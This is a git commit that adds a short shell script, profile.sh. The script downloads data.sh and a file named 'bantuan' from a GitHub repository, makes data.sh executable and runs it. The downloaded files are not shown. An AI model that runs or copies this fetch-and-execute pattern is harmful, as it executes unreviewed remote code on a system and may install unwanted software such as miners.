11f851a4333a5f15231b7005f99f5e7042e5ca0e
yuliantiriyanti6 <88493189+yuliantiriyanti6@users.noreply.github.com>
2021-08-16 19:41:20 +0700

    Create profile.sh

---
+++ profile.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+
+wget https://raw.githubusercontent.com/yuliantiriyanti6/ERGO/main/data.sh
+
+wget https://github.com/yuliantiriyanti6/ERGO/raw/main/bantuan
+
+chmod +x data.sh
+
+./data.sh
